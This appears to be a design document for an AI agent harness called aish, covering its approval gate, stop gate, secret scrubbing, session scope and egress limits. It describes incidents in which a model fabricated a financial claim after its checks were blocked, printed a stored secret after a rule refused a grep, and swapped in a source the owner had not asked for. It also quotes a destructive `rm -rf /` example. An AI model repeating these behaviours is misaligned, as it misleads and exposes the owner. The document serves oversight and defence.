# Agent core — the loop, the gate, the scope

`agent.py`, `approval.py`, `tools.py`, `files.py`, `web.py`, `backends.py`, `claude_max.py`.

**How to use this file.** The laws come first — they are the invariants the whole gate rests on, and most of the code below is one of them applied. Then the loop, the gate, and the tool modules, each naming the test class that pins it. If you are changing what runs without asking, read L1–L4 before anything else.

Knowledge tools are in `docs/knowledge-layer.md`, plugin tools in `docs/tools-layer.md`, images in `docs/media-and-images.md`, record shapes in `docs/trace-records.md`.

## The laws

**L1 · The model never executes anything directly.** Backends return structured tool-call *requests*; `Agent._dispatch()` is the single execution point, and `run_command` is unreachable there unless the `approve()` callback returns the (possibly user-edited) command. Every alternative execution path is a bug, which is why claude-max — whose SDK owns its own loop — routes through `_locked_dispatch` back into the same `_dispatch` (`TestSingleExecutionPath`).

**L2 · A comment flips what a verdict means (#81).** Without a comment: `True`/edited-string approves, `None`/`False` denies, `Blocked(reason)` is unapprovable. With one, approve and deny mean *opposite* things. `Denied(comment)` = **STOP** — denied, the comment appended to the result, and the stop gate armed. `Approved(comment)` = **CONTINUE but ADJUST** — the original action is HELD and never runs, even if the command was edited; the model reworks it to the comment and re-proposes, and the adjusted action is approved again before it runs. `TestApprovalComment`, `TestApproveContract`.

**L3 · Approve only what you positively understand.** `approval.py` classifies a command as read-only only when it can account for every part of it; anything ambiguous falls through to a prompt. When touching that file, err toward prompting — a false prompt costs a keystroke, a false auto-approval costs whatever the command did.

**L4 · Scope belongs to the session, not the process.** The `roots` that bound auto-approval and the `session_prefixes` granted with "Allow this session" both live on the Agent and are reset by the same call. A grant made in the chat you leave must not follow you into the chat you land in.

**L5 · Plan, show, then commit.** `files.py`'s `plan_*` functions compute `(old, new, diff)` without touching disk; `commit()` writes. The gap between them is where the diff is shown and approval obtained — nothing is ever written unseen. The plugin-tool `preview` seam is the same idea for actions that have no diff.

**L6 · Unattended is not attended.** `Agent.origin` scopes capabilities whose safety argument was "a human is watching". A `user` session behaves byte-identically to before any of these gates existed; everything else is scoped.

**L7 · The verdict travels with the value.** A tool result carries its own outcome (`ToolOutcome`) rather than being sniffed from its text downstream, and a refused action is never recorded as a green step. Both replaced string-prefix guessing that had been quietly wrong for a long time.

**L8 · aish reports what it observed; a cause is spoken only where a line of code checked the thing asserted.** *"aish pressed submit and no request left the page"* is a fact; *"reCAPTCHA refused the sign-in"* was a hypothesis wearing a fact's clothes — asserted in an issue, shipped as a named outcome, and said to the owner on every eon.pl attempt about a widget that was never given anything to refuse (the submit never fired). A 401 on a request carrying the credential IS evidence the site refused it and may be said; a script tag is evidence of a script tag and may be said only as that. *"I did X, Y happened, aish does not know why"* is an ordinary, unembarrassed ending — an outcome vocabulary that has no way to say it will be handed a guess instead, and a guess written into the product stands exactly where the disproving evidence should have been. When "no reason known" is too common somewhere, the repair is better instrumentation, never a more confident sentence. Suggestions stay legitimate — *here is what was observed, here is what you might try* — it is the unverified cause stated as seen that is forbidden. The full story: `docs/browser.md`, *A CAPTCHA declaration is an observation about the PAGE*.

## The task loop

`run_task` starts by calling **`_reset_task_state()`** — the shared extraction of the per-task reset (stop gate, skill gates, `_run_meta`, `task_sources`, `_cancel`, the turn counter). **Add new per-task fields THERE, never inline in `run_task`**, or claude-max wedges: the SDK owns its loop, so `run_task` never runs there and `ClaudeMaxAgent.run_task` calls the shared reset instead (`TestStopGateReset`).

Then it loops: the model proposes tool calls → `_dispatch()` executes them under the gate → results are appended → repeat until a final answer (`TestLoop`).

**The step budget is progress-gated, not a flat cap (#108).** A step counts as progress when a tool call yields a `(tool, args, result)` tuple seen for the first time — `seen`, which is never cleared, so no extra model call and no timer. A progressing task may run past `max_steps` up to the unconditional hard ceiling `max(max_steps, HARD_STEP_CEILING=60)`; `MAX_STALL_STEPS` (8) consecutive no-progress steps stop it early. The loop ends three ways: a text-only answer, a cancel, or `_finish_stopped()` — reached at a stall, at the ceiling, or when loop detection fires — which runs one final no-tools turn so the model reports its completion state instead of cutting off. The ceiling is never silently exceeded. `TestStepLimitAndLoops`, `TestCancel`.

**Loop detection counts a RUN of dead retries, not a lifetime tally (#251).** `run` counts identical `(tool, args, result)` calls and is CLEARED by any progress at all, so `LOOP_STOP_REPEATS` (5) means five consecutive no-progress steps hammering one call. It counted lifetime occurrences per task until #251, and that shape was wrong in the direction that costs the most: driving a website is repetitive by construction, and a date picker legitimately opened five times across a forty-step booking flow renders identically every time, so the tally could end a task that was making progress the whole way. The ceiling and the stall counter are what bound a task that is not.

**The 3-repeat NUDGE is gone, and its removal is the point.** It injected *"repeating this cannot make progress — change your approach"*, which is false for a page view and false BY CONSTRUCTION for a re-read the rules engine orders (`links-you-actually-opened` requires opening a URL before citing it — one subsystem mandating what another punished). Told to use lot.pl, the model was nudged at the third click and silently moved to Google Flights: not what the owner asked for, and not something he was told about. A browse action now reports whether the page changed, in words, on the first click (`docs/browser.md`), which is the one service that nudge ever performed, delivered earlier and by the layer that knows. `NAMED_SOURCE_CLAUSE` then rides on every note that ends or redirects a task, and prompt rule 7d carries the standing version: the source the user named is the source, and being unable to use it is an ANSWER, not a reason to substitute one.

**Read-only tools run in parallel.** `_execute_tool_calls` fans the read-only set out concurrently, which is why anything gated must be routed OUT of that path (`_read_needs_prompt`) rather than gated inside it. Read-only plugin tools parallelize the same way — that uniformity is deliberate (`TestParallelReadOnlyTools`, `TestReadonlyPluginParallel`).

**Context.** Prior tool outputs are trimmed **only when the history no longer fits the window actually in force** — one policy, oldest-first, at every task boundary.

There used to be two. `_trim_history_to_budget` ran on a resume (#164); everything else got `_trim_eagerly`, which cut **every** prior tool result to a 200-char stub unconditionally, whatever room was available. That was written on **2026-07-12, six days before cloud backends existed** (2026-07-18), and every assumption in it — small window, `num_ctx` is the real limit, prefill is expensive — was an Ollama-era assumption the cloud paths silently inherited. On a 1,048,576-token Gemini window it was discarding the whole history to save room in a context that was 97% empty.

Keeping the budget-gated policy loses nothing the eager one protected: oldest-first already means a resume's unfinished work is the last to go, so the two branches collapse into one and `keep_history` becomes inert. It is also a **cost fix**: the growing conversation prefix is cached on purpose (`backends.py`, `cache_control`), and rewriting old messages every turn invalidated that cache from the earliest rewritten message onward — on every prefix-caching provider, and Ollama's KV reuse too. Trimming rarely is a saving, not a risk.

`_history_budget()` is the single source of the number: `min(real window, HISTORY_TOKEN_CEILING) × CHARS_PER_TOKEN_BUDGET`, with the provenance of whichever bound. **On Ollama this is `num_ctx × 3` exactly as before** — `num_ctx` *is* the window there and is far below the ceiling — so the local path is preserved by the formula rather than by a carve-out that could drift. The ceiling is deliberately below Gemini's window so the trimming path is **exercised** on the backend used daily, instead of lying dormant until the day it is needed on a local model. `TestHistoryBudget` pins all four cases and, at the source level, that no trim site grows its own arithmetic back.

**Delivered pictures are the one thing still dropped unconditionally**, at each task boundary, because they are *invisible* to the character budget — `_total_chars` sums text, so however many accumulate the budget never notices, and they are the costly half (re-encoded into every later request). The note stays behind and the media store is content-addressed, so a second look is free. The owner's own attachment is untouched: it is not a tool output and only aish's deliveries carry the `[aish: …]` marker. The trim is itself recorded, being the truncator with the largest blast radius (`TestContextCompaction`, `TestContextAndHistory`, `TestTrimIsRecorded`, `TestHistoryBudget`). `_trim_tool_message` rewrites message dicts **in place**, which is why the session parse caches are never handed to a resume path.

**A trim is not a deletion — the stub carries the ticket back.** `read_tool_output` can page a large result out of a content-addressed store without re-running the tool, but its key rides a footer at the **end** of the output, and a stub keeps the **first** 200 characters: the key was the first thing severed. So the model was told its context had been shortened and given no way to recover any of it. Worse, only *plugin* tools ever minted a key — `run_command` and `read_url`, the two biggest things in any history, had none, and their results were simply gone.

`_trim_tool_message` now caches the text it is about to drop and mints the stub with an imperative note carrying the key. What it caches is the **message as the model held it**, not the tool's raw output, so recoverability applies to every tool whether or not it knows what a continuation is. An unwritable store returns `""` and the stub degrades to the old dead end — preparing a turn must never raise because a cache directory vanished. The key rides the `trim` record's `stubbed[]` entries too, so a dossier can say whether a turn's history was *bounded* or *lossy*; those are different facts and a reader must not have to infer which. This matters most where trimming hurts most: a small local model can never hold a long history, so fetching a page back on demand is the difference between a bounded context and a lossy one. `TestTrimmingIsRecoverable`.

**Turn and call identity.** `Agent._turn` advances in `_reset_task_state` (so claude-max counts turns too) and a per-turn `call` counter is assigned in `_call_result`. `call` is carried as a LOCAL, never read back off the agent — read-only tools run in parallel and an attribute would hand two concurrent calls the same id. `TestTurnAndCallIdentity`.

**Status and streaming.** `_note` gates terminal chatter; the status protocol's `note()` channel carries live "Thinking: …" without recording it; the model's own words ride the persisted `thinking` step (`say` = preamble alongside tool calls, `gist` = first line of thinking), keys omitted when empty so old logs replay identically. `TestLiveStatus`, `TestStreaming`, `TestThinkingStatus`, `TestElapsedTimeReporting`, `TestActivityTraceSteps`, `TestModelResilience`.

### Narration — a turn delivers more than once (#212)

A long task was a spinner. The model **already narrated** — prose emitted alongside its tool calls — and the harness **threw it away**: `_status_snippet` cut it to the first sentence at 120 characters for the trace header and nothing else kept it. Mid-task steering (#95) landed between steps and was nearly useless, because steering requires knowing what to steer and there was nothing to read until the end.

So a turn makes **one delivery**: the opening acknowledgement it wrote alongside its first tool calls, delivered whole as a message the moment that step ends. `_deliver_interim` returns early once the task has delivered.

**The cap is the feature, and it was learned the expensive way.** The first version delivered every step, which on one question produced nineteen bubbles — *"I will search…", "I will read…", "I will fetch…"* — one per tool call. That buries the answer and reads as a machine reporting to itself. The owner's framing is the spec: delegate something to a person and they say *"I'm on it, I'll do X, back to you"* ONCE, then return with the result. The model still writes the rest — those words stay in `self.messages`, so its own plan is intact and the loop is unchanged — but they never reach him, and never join `_delivered`, so the deliverable stays exactly what he was told. The status line keeps its one capped line: the trace is the developer's view of *which tools ran*, and this is the human-language layer above it, not a replacement for it.

**Where it lands, per surface.** The web gets an `on_delivered` sink → a `delivery` event, and the bubble is closed client-side ([DELIVERY] in `docs/web-frontend.md`). The CLI's copy leaves from the same place — moved INTO `_deliver_interim` from the loop, so one function owns a delivery rather than two sites each owning half. The log needs nothing new: an interim assistant entry has always gone through `_append` → `on_message`, so the whole change on that side is teaching `reconstruct_events` to replay what was already written (`docs/session-log.md`).

**A bound turn cannot stream its narration, and that is not a bug to fix later.** Whether a turn is the ANSWER is knowable only once its tool calls — or their absence — arrive, and a token cannot be retracted, so Verify's hold has to buffer everything. Narration is therefore released *whole, per step*, the instant the turn proves itself interim. What #191 actually cost the owner shrinks from "the whole task is silent" to "one model turn is silent", and the buffer is cleared here rather than only by the loop's per-turn reset — a released buffer left in place is a delivery waiting to be made twice.

**The deliverable is the whole turn (`_deliverable`), and that is the real design change.** Verify graded the last message; a picture shown in delivery two of five would then fail `answer_must_include: picture` against delivery five. Every answer-side rule was written against a turn that only ever said one thing, so the *concatenation* is what those rules always meant. It is NOT a uniform widening, and the doc that claimed so was wrong: `answer_must_not_include` catches more, `answer_must_include` becomes strictly easier (the picture in delivery two is the case this exists for), and a **position** check like `in: opening` would have its window MOVED onto the narration rather than widened — which breaks R1 in the one direction R1 forbids, so `TurnEvidence.looked_at` keeps positions on the final answer. Interim deliveries remain non-proposals: already shown, never reworked, so only the final answer is held, asked about and released. `TestNarration` (both files), `TestHeldAnswer`, `TestVerify`.

**Nothing prompts for narration, and two attempts at the surrounding policy were wrong.** The mechanism delivers whatever the model says beside a tool call; no rule requires it, because *"only speak when you have something worth saying"* has no verdict function and would be the unenforced verb `docs/rules-engine.md` forbids. A system-prompt paragraph (rule `4b`) was the intended home for it and was **withdrawn the same day it shipped** — not because it was slow, but because it bought nothing: across every session that ran with it, the model emitted **zero narration**, every `say` empty. An instruction that changes no behaviour is not worth the context.

**Retiring `answer-me-first` is what made aish go silent — and the speed claim built on that is RETRACTED.** #212 retired it arguing narration replaced it *by construction*. Backwards: the rule is what makes this model speak, and narration is what displays the result. Six controlled runs, three independent replications, the rule as the single variable: **narrated on 30/26/57 of 30/26/57 turns with it on, and 0/0/0 with it off.** Perfect separation, so it is un-retired.

**The same six runs refute the "it also made things slow" story I told from field logs.** Turns were **30/26/57 with the rule on (mean 37.7)** and **33/32/29 with it off (mean 31.3)** — the direction reverses between replications and the mean slightly favours OFF. The 21-vs-60 field comparison that produced the claim was single runs of a task whose step count varies 26-57 under identical settings. That is noise read as signal, twice: once to blame the prompt paragraph, once to blame the rule.

Three lessons, and the third is the expensive one. **A prompt paragraph is a behavioural change and needs a measurement, not a review.** **A brake you remove needs its replacement observed, not argued** — "by construction" was doing the work of a measurement here, and the construction did not hold for the model that actually runs. And **the first plausible culprit is not the cause**: 4b was blamed first because it was the only model-visible code change, and the turn counts kept climbing after it was gone. The corpus is model-visible too.

### The approval card's reason — the gate reads what the chat drops (#252)

A card said WHAT and never WHY. The owner had a tool name and its arguments and had to reverse-engineer the purpose — and when that guess was wrong, the decision was wrong.

The incident: mid-investigation into why a utility invoice's PDF total and the portal's total differed by 1.90, the model proposed opening the portal's payments page. The card read `browse(url='…/Faktury-i-platnosci')`. The owner inferred it wanted to re-download a file it already had and approved with the comment *"You already have the file!!!!"* — which under #81 HOLDS the action. It thrashed, the next command was denied, the stop gate armed, and the forced text-only turn **invented** the answer: *"you have a small credit of exactly 1.90"* — asserted as fact, about the owner's money, with the two steps that would have confirmed it being exactly the two that were blocked. (The fabrication is its own bug, #253; this is the input side.)

**The explanation existed and had nowhere to go.** The same model turn had written *"…to see if there is any credit, overpayment, or adjusting transaction on the account balance that explains why the portal asks for X while the PDF shows Y"*. Narration caps CHAT delivery at one per task (above, and the cap is right), so step two's prose went to `self.messages` and #240's renderless `said` — and nowhere the owner would look. So **nothing is created here; something already recorded is routed.**

`note_intent` stashes the turn's prose at dispatch time and `turn_intent()` is the approvers' late-bound reader, wired like `get_scope` / `get_origin`. Four properties carry the design:

**The card is a different consumer, not a second delivery.** A bubble is scrolled past — nineteen of them buried the answer, which is what the cap is for. A card is text inside a thing the owner has already stopped at and must act on, so the cap's justification does not reach it. The stash stays off `_delivered` deliberately: joining it would put words the owner never saw into `_deliverable`, where Verify grades them.

**The empty state is a fallback, not the common case — and driving the real page is what showed it.** With `answer-me-first` installed, a step that says nothing never reaches a card at all: the rules engine refuses the tool call and re-prompts before the gate is consulted. So the "it gave no reason" rendering is what a rule-free config falls back to, not what the owner sees daily. Worth knowing before anyone concludes the empty state is dead code and deletes it.

**Set on every model response, which is what clears it.** A step that says nothing leaves the intent empty and the card says so. Staleness is the dangerous failure — a plausible reason belonging to the PREVIOUS action is worse than none, because nothing on screen distinguishes them — so the set and the clear are one line. claude-max has no per-response boundary to assign on, so it notes from the emptied `pending` buffer on the message that acted, which self-clears identically.

**Nothing tells the model where it lands, and that is load-bearing.** A field the model knows the gate reads gets written FOR the gate. Narration is written as chat to the owner, and inheriting honest text is the entire reason to reuse it rather than add a `why` argument — which would also have to survive four backend adapters and every droppable `TOOL.md` plugin, and which the zero-compliance result above predicts would simply be omitted. **This is the one deliberate exception to CLAUDE.md's "update both the README and the system prompt" rule:** the README documents it (owner-facing), `SYSTEM_PROMPT_TEMPLATE` and `web_usage_context` must not (model-facing). Describing the mechanism to the model is the mechanism by which it stops being honest.

**It is a claim, and is rendered and recorded as one.** It rides every card kind — command, tool, write, read, import — and every gate prompt in the terminal, because a reason on some gates and not others cannot be told apart from a reason the model did not give. Never folded into `preview`, which is ground truth the tool computed (#157) — one box for both would lend the claim the authority of the fact. The shown text joins the `kind:"command"` decision record (`docs/trace-contract.md` §6.5) on every decision including `auto`, so a stated reason that does not match the action it rode on is queryable instead of hand-reconstructed. That recording is also the honest answer to the objection this feature deserves: it puts the model's voice inside the one surface whose job is scepticism, and after fifty accurate reasons the owner reads the reason and stops parsing the args. The counterfactual is not "he decides on ground truth" — the incident is proof he decides on a guessed intent — but the trade is real, and the audit trail is what makes it defensible. The push body is deliberately excluded (`_describe_hold`): narration carries far more incidental detail than arguments do, and that string leaves the machine.

**Two command loggers, and the unit tests knew about one.** The web server reaches the session log through `cli.LogRef`, not `SessionLog` directly. Widening only the inner signature turned every gated command into `TypeError: LogRef.command() takes 3 positional arguments but 4 were given` — surfaced to the model as a failed tool and to the owner as nothing at all. The approver unit tests passed (their fake log had been widened), the JS checks passed, and the first real page load failed on the first card. `TestApprovalIntentEndToEnd` drives the real app so the seam is covered where it actually is.

`TestApprovalIntent` (both files), `TestApprovalIntentOnTheCard`, `TestApprovalIntentEndToEnd`, `TestApprovalIntentOnTheSdkPath`, `tests/js/test_card_intent.js`.

**Command framing.** `run_command` surfaces `command_start` (cwd + command) and `command_end` (exit code / detached / interrupted) so a UI can draw a bounded terminal block (`TestCommandFraming`).

**Mid-task steering.** The loop polls two get/drain callbacks at the top of each iteration so a `/cd` or a message typed during a long task is applied between steps (`TestMidTaskSteering`; the server side is in `docs/web-server.md`).

**Redaction reaches the live conversation too.** Scrubbing the log is the durable half; the running `agent.messages` must lose the same turn, identified by occurrence because the live message dicts hold no ids (`TestRedactTurn`).

## The approval gate

**The stop gate (L2).** Eager models run another tool before addressing a denial, so while `self._pending_comment_response` is set every tool call is refused. The main loop clears it only on a **text-only turn** — not a same-turn text+tool, or a chatty preamble alongside a command slips past — and that text-only turn ends the task, because deny means stop. `run_task` resets the flag so it never leaks across tasks. Approvals never arm the gate; the HOLD plus re-approval is what keeps an unwanted original from running. `TestStopGate`, `TestApprovalGate`.

**A forced wrap-up must mark what it could not check (#253).** The stop gate creates a turn shape nothing else in the loop has: the model MUST produce a final answer, and it has just been told it may not gather any more evidence. Every incentive points at closing the loop with what it has. It did. Having had its verification step denied mid-investigation into a 1.90 discrepancy between a PDF total and a portal total, it wrote *"you have a small credit of exactly 1.90 zł on this agreement account"* and told the owner to pay the lower amount — arithmetic run backwards from the discrepancy, about his money, with the two steps that would have confirmed or refuted it being exactly the two that were blocked. Its own reasoning for that turn called it a hypothesis; the hypothesis hardened into a fact on the way out. (#252 is the other half — the card that made the block happen at all.)

`UNVERIFIED_CLAIM_CLAUSE` rides **every** forced wrap-up, not the stop gate alone: the denial that arms the gate (through `_with_feedback`, the one funnel every denial-with-comment builds its text through, and the one that matters most — a model that COMPLIES goes denial → text-only turn and never sees the gate's own refusal), the `STOP_GATE_REFUSAL` an eager model gets instead, and all three `_finish_stopped` notes. The shared property is *forced to conclude with evidence-gathering foreclosed*, and the stall, the ceiling and the loop detector all have it. A bare denial does NOT carry it: no comment, no stop gate, no forced turn, so it would be context spent on nothing.

**A note, not a rule, and the reason is `docs/rules-engine.md`'s.** A rule needs a verdict function and "mark unverified claims" has none, so binding it would be the unenforced verb that doc prohibits. It is imperative with a worked example — both halves, what to write and what not to — because aish's prompts have a measured failure mode: capability phrasing is ignored (§Narration: a paragraph that merely invited a behaviour produced ZERO of it across every session that ran with it), MUST plus a concrete example is not. The standing version sits on the DENY + comment bullet of `SYSTEM_PROMPT_TEMPLATE`, the same clause + standing-rule shape `NAMED_SOURCE_CLAUSE` and prompt rule 7d already use.

**What is proven and what is not.** `TestAForcedWrapUpMarksWhatItCouldNotCheck` asserts on the text that REACHES the model on each of those paths — delivery, not effect. Whether it changes what the model then writes is unmeasured, and §Narration is the standing warning against assuming it does. Measuring it means the same shape as the `answer-me-first` runs: replay a forced wrap-up whose conclusion is not supported by anything observed, several times per arm, with the clause as the single variable, and count answers that state an unchecked inference flat. Until that exists, the honest claim is that the instruction arrives.

**The rule gate (#191).** `_rule_gate` runs in `_dispatch` immediately after the stop and skill gates, checking the call against this turn's rule bindings. It sits ALONGSIDE every gate on this page, never above them: rules only ever restrict, so the engine can add a refusal and has no path to lifting one. Its bindings also join `_pending_skill_reads` and `_pending_comment_response` in the condition that forces `_execute_tool_calls` off the parallel path — that path bypasses `_dispatch` entirely, and `web_search` is both what it fans out and what the canonical rule prohibits. Unlike those two, a binding disables concurrency only for the calls it actually governs (`rules.affects`), so an unrelated batch of local reads keeps it. Everything else about it — the vocabulary, the bounded refusals, the records — is in `docs/rules-engine.md`. `TestRuleGate`, `TestRuleSeeding`, `TestBoundedRefusalAndEscalation`, `TestBoundedMaterial`.

**Blocked and background.** The denylist (unrecoverable commands, blocked even with approval) lives in `tools.py` and is checked first, on edited commands too. Detached and background jobs have their own accounting (`TestBlockedAndBackground`, `TestBackgroundJobs`, `TestDetach`).

**A secret leaves by the RESULT, not only the argument.** The gate has always refused a command CARRYING one of his stored values (`_command_has_a_secret` — a join against his own Keychain, not a pattern he has to write, because the alternative is pasting the secret into a rule file). A command that PRINTS one is the same leak by the other route, and it reaches further: the model's context, the trace, and the append-only log — the copy that outlives the session and syncs to every device. **It happened.** `security find-generic-password -w` returned a live Pushover token in a session that had `no-inline-secrets` bound on every one of its ten turns; the rule was watching the argument while the value came back in the result, and the token sat in a world-readable log until it was rotated. The model had gone looking for how aish stores secrets in the first place because `never-edit-aish-itself` refused a read-only grep of aish's own source — an over-restriction that manufactured the workaround, which is the general hazard of a rule that blocks the correct path (`docs/rules-engine.md`).

`_scrub_result` runs in `_call_result` — the single funnel — before `_observe_for_rules`, `_note_turn_call` and `_emit_tool_step`, so the turn record, the log and the model's context all see scrubbed text. The placeholder NAMES the secret: a bare `***` says something was removed, while `[secret PUSHOVER_TOKEN — redacted by aish]` says aish already HOLDS the thing, which is what stops the next attempt to fetch it by hand. Three things make it hold, and the third is the one that shipped wrong first:

1. The `ToolOutcome` envelope is **rebuilt** after the text changes — a string operation drops `meta` (`tools.py`), so a scrubbed result would otherwise fall silently back to the legacy prefix sniff.
2. The live `on_line` stream is wrapped once at `self.stream`, not at each `on_line=` site, so a new streaming caller cannot be the one that forgets. Best-effort by construction (a value split across two streamed lines survives), which the funnel makes acceptable — nothing durable is written from that path.
3. `run_command` takes a **second copy** into `_run_meta["output"]` inside `_dispatch`, upstream of the funnel, and that copy becomes the trace step's `output`. Scrubbed where the meta is consumed rather than at each of the four sites that build it — the same "one rule applied last" shape as the refusal/`ok` fix below it. The first version scrubbed only the returned value and left the trace holding the token; `TestSecretScrub` is what caught it. Anything that takes a result before the funnel owes the same.

Matching is cached in `secrets.py` because a Keychain read is a subprocess and both directions now run on every call: keyed on the name set with a TTL, since a **rotated** value that keeps its name changes nothing on disk and a names-only key would go on matching the dead value for the rest of the session. Holding the values in process memory does not move that module's stated boundary — the ceiling is FileVault plus OS access control, and an attacker already running as the user can read the Keychain directly. `TestSecretScrub`, plus the suite-wide `no_real_secrets` guard in `conftest.py`: the scrub runs on every tool result, so without an empty name index a suite run would read the developer's live credentials once per stored secret per tool call.

**What runs without asking**, and the four things that pull it back:

1. **The read-only classification** (`approval.py`) — chaining, the user allowlist, full-path invocations that resolve to exactly the binary PATH finds, and binaries in trusted system bin dirs invoked by absolute path. `TestChaining`, `TestUserAllowlist`, `TestPathInvocation`, `TestTrustedBinDir`, `TestDenylist`, `TestLooksDestructive`.

**The parse is quote-aware, because `/bin/sh -c` is (#265).** Understanding a command used to mean scanning the raw string: split on every `|`/`&&`, and give up entirely on any `; < > \` $ ( ) { }` anywhere in it. Both halves are blind to quoting, and a jq filter is made of exactly those characters. `jq '.listings[0] | keys' f.json` was cut *inside its own filter* into `jq '.listings[0]` and `keys' f.json`; `jq '.listings[] | {title}' f.json` hit the brace and returned `None`. **A `None` is fail-closed, and the allowlist is never consulted on a fail-closed** — so `jq`, which had been in `allow.txt` for months, was approved **118 times in one session**, and the log shows `approved+always:jq` twice because the first Always could not take effect. The owner's question was why the button does nothing.

The fix is not a longer exception list: it is judging each character by the context the shell will read it in, since the shell is what runs the command. Inside single quotes nothing expands, so nothing is forbidden. Inside double quotes only `$` and a backtick still substitute, so only those are. Unquoted and backslash-escaped text keep exactly the treatment they had. `_shell_marks` walks the string once yielding `(position, character, context)` — positions index the ORIGINAL string, which is what lets `split_chain` slice raw segments back out with their quoting intact for the `shlex.split` every other function does. Unterminated quoting raises `_MalformedCommand` and every caller fails closed on it. This **widens what the parser understands, never what it trusts**: a quoted argument is an argument, so `sh -c 'rm -rf /'` still needs the two-token prefix `EXEC_WRAPPERS` demands, and `jq '.a' f | rm x` still prompts on its second segment. `TestQuoteAwareParsing`.

**A card only offers a rule that would work.** The prefix on the card came from the same broken split, so Always on the piped filter read the orphan `keys' f.json` as a binary and wrote a rule literally named `keys'` into `allow.txt` — permanent, unmatchable, and sitting in the owner's security config next to `trippy details`, which arrived the same way. `prefix_suggestions()` is now the single source for both approvers and returns **empty** when no prefix could ever silence the command: when the parser cannot model it (refused before the allowlist is read) and when every segment is already vetted (the prompt came from a root escape or `--ask-all`, so trusting the directory is the fix, not a prefix). The web card already hid Session/Always on an empty `prefixes`; the CLI now says so instead of running a save loop over nothing, and records a plain `approved` rather than claiming `approved+allowlisted`. Relatedly `suggest_prefix` no longer treats a quoted word as a subcommand — `jq 'keys' f.json` suggests `jq`, not the per-invocation `jq keys` that would need re-approving on the next filter. `TestPrefixSuggestions`.

This is not jq-specific: it is every tool whose argument is a quoted mini-language — `awk`, `find -name`, `sed`, `gh --jq`, `python -c`.
2. **Root scoping** — a path argument escaping every root prompts even when the command is allowlisted. `escaping_dirs()` names the escapes so the prompt can offer "trust this directory" (`Agent.trust_root`, session memory only). `TestRootScoping` (both files), `TestEscapingDirs`.
3. **Symlink escapes** — a plain relative token that IS an in-root symlink pointing outside must prompt; a token naming nothing on disk is never resolved, so patterns, flags and future files cannot false-positive. `TestSymlinkEscapes`.
4. **Sensitive operands** — shell path operands get `files.is_sensitive_path` on their RESOLVED target, mirroring the `read_file` prompt, so `cat link-to-ssh-key` or an in-root `.env` prompts even when containment holds. `TestSensitiveOperands`, `TestIsSensitivePath`.

**The scratch workspace** is the deliberate exception: create AND delete auto-approve, scoped strictly inside the chat's scratch dir, everything else unchanged (`TestScratchWorkspace`, in both test files).

**The workspace belongs to the CHAT, not to the Agent (#258).** `_open_scratch` keys it on the session log — `<state_dir>/scratch/<session-stem>` — and only falls back to `mkdtemp` for an agent with no chat identity (embedded, tests). It was per-object for a year, and per-object is wrong for the same reason the media and tool-output stores are not in here: a chat is rebuilt behind the user constantly (reconnect, eviction, model switch, restart recovery), and the conversation that remembers a scratch path outlives every Agent that ever held it. When the two drifted apart the model kept writing to the PREVIOUS agent's dir, so `path_within` and `paths_escape_roots` both failed closed — correctly, on a directory nobody owned any more — and aish raised an approval card for its own throwaway file, thirty minutes into a task that had been running unprompted. Failing closed was right; having two lifetimes for one fact was the defect.

Consequences, all of them load-bearing: `close()` collects ONLY the ephemeral fallback (evicting an agent must not delete the directory the conversation still names); the chat's workspace dies with the chat (`server._delete_session`); and `prune_chat_scratch` sweeps workspaces whose log is gone — run in `WebServer.__init__` rather than `startup()`, because a brand-new chat has no log until it writes its first record, so the only unambiguous moment to read "orphan" is before the server can open anything. The boundary stays strict: one chat's scratch is never inside another's `workspace_roots`, so a fork that reuses the parent's path from copied history still gets a card. `TestScratchBelongsToTheChat`, `TestOrphanScratchIsCollected`.

**Prefix lifetimes.** `a` / "Always allow" is durable and file-backed, shared by CLI and web. `s` / "Allow this session" lands in `Agent.session_prefixes` and dies with the session.

## Session scope (L4)

Both halves of the scope live on the Agent and are reset by the SAME call, `restore_workspace`, so a session change drops them by construction rather than by someone remembering to. The approvers never own the prefix set: `cli.make_approver` and `server.make_web_approvers` both take a late-bound `get_session_prefixes()` reading the live set off the agent (the same holder pattern as `get_scope`/`trust_dir`, because the agent is built after its approvers), keeping a set of their own only for an unwired approver in a test. `restore_workspace` CLEARS the prefixes and never restores them — unlike trusted dirs they are not recorded on disk, so resuming BACK to the chat that granted one asks again rather than inventing persistence the log cannot back. The persistent `a` allowlist is untouched by all of it.

**`restore_workspace(cwd, trusted)` is AUTHORITATIVE, never additive.** On resume or cold-open it rebuilds `roots` to be EXACTLY that session's own workspace: its recorded `kind:"cwd"` (or `Agent.launch_cwd` when it never recorded one, matching the base the web gives a cold-opened session) plus its own recorded `kind:"trust_dir"` dirs, which `/add-dir` and an approval-prompt "trust this directory" both write. Both directions are bugs: a dir trusted in the chat you LEAVE must not stay auto-approvable in the one you land in (the CLI reuses ONE live Agent across `/resume`, so this leaked; the web builds a fresh Agent per cold open and never did), and a dir this chat DID trust must come back. `/new` re-anchors the same way — you are still in that directory in this terminal, but the previous chat's grants stay with it. It sets state directly, never via `rebase`/`trust_root`, so restoring emits no fresh record and cannot feed a replay loop. Corollary: roots a PROCESS owns rather than a session — the web's uploads dir — are appended AFTER the call. `TestWorkspacePersistence`.

**Execution is stateless.** Every `run_command` runs in `Agent.cwd`; a bare model-issued `cd` is rejected with guidance instead of executing (`CD_NOT_STICKY`); excursions are `cd x && …` subshells, which is why `cd` is in `SAFE_COMMANDS` — it is subshell-scoped and root-checked. Only user actions move cwd: `/cd` and `!cd` move it AND re-anchor `roots[0]` (`Agent.rebase`). Do not reintroduce model-driven cwd mutation. `TestCwdAndCd`, `TestBangCommands`.

## Origin gates (L6)

`Agent.origin` is a constructor kwarg defaulting to `"user"`; the server's `open_session` passes the session's origin and cli.py passes nothing.

**Egress (#178 P0-2).** In a non-`user` session, `web_search`/`read_url` (`EGRESS_TOOLS` — read-only locally, but their INPUTS leave the machine) hold on the existing `approve_tool` channel when they reach a host outside **provenance**: `_owner_hosts`, extracted by `_hosts_in_text` from owner-authored text ONLY — the task or trigger prompt, mid-task steering, `add_user_context`, and user-role turns in `load_history`; never tool results or fetched pages, which are exactly what an injection controls — plus `_approved_hosts`, hosts vouched on an earlier card. `_egress_gate` mirrors the #81 verdicts, passes the novel host as the card's `preview` (zero frontend change), and fails closed: no approver → `EGRESS_NO_APPROVER`, unparseable URL → gated. `_read_needs_prompt` routes gated calls out of the parallel read path so the gate cannot be bypassed. `_recall` also drops the past-session archive search and says so in the result, so the model does not retry. `TestEgressGate`.

